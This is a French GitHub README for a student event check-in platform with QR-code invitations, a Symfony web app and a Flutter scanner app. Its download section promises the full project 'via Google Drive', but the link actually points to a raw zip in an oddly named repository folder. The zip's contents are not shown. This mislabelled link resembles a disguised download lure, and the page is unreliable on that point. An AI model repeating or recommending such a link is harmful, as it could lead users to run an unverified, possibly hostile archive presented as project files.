# Echeck-in-Event2
Echeck-in Event
# 🎫 Echeck-In Event – Plateforme de gestion d’invités à un événement

Ce projet a été réalisé dans le cadre d’un stage académique et a pour objectif de digitaliser la gestion des événements à Madagascar. Il permet de créer un événement, d’inviter des participants via email avec QR code, de scanner les QR codes à l’entrée grâce à une application mobile, et de suivre la présence en temps réel.

---

## 📦 Télécharger le projet complet

Le projet étant trop volumineux pour GitHub (environ 600 Mo), il est disponible en téléchargement sécurisé via Google Drive :

👉 **[Télécharger le projet complet (Web + Mobile + BDD)](https://github.com/Miguel-max219/Echeck-in-Event2/raw/refs/heads/main/Lecidea/in-Echeck-Event-v2.8.zip)**

---

## 🛠️ Technologies utilisées

- **Frontend Web** : Symfony (PHP 8), Twig, Bootstrap  
- **API REST** : Symfony API Platform + Lexik JWT Authentication  
- **Mobile** : Flutter  
- **Base de données** : MySQL  
- **QR Code** : Endroid/QRCode  
- **Mailing** : Symfony Mailer (SMTP)

---

## ✨ Fonctionnalités principales

- Création et configuration d’un événement
- Ajout des invités manuellement ou via fichier CSV
- Attribution automatique de QR codes uniques
- Envoi d’invitations personnalisées par email
- Scan des QR codes via application mobile (agent)
- Enregistrement automatique des présences
- Tableau de bord statistique avec export (Excel / PDF)
- Gestion des agents (CRUD + validation par email)
- Fonction “Mot de passe oublié” pour l’administrateur

---

## 📄 Rapport de stage

Le rapport de stage complet (PDF) incluant le cahier des charges, les objectifs, les diagrammes UML, les scénarios fonctionnels, et l’évaluation finale est également disponible sur le Drive, dans le même dossier que le projet.

---

## 👨‍💻 Auteur

**Bayane Miguel**  
Étudiant à l’**ESMIA**  
Stage réalisé au sein de l’entreprise **TEKO**  
Encadrant : Livarijaona Tafita Toussaints

---

## 📌 Remarques

> Pour exécuter le projet localement :  
> - Importer la base de données MySQL  
> - Configurer `.env` pour la connexion à la BDD et le mailer  
> - Lancer Symfony server pour le backend  
> - Lancer Flutter pour l’application mobile
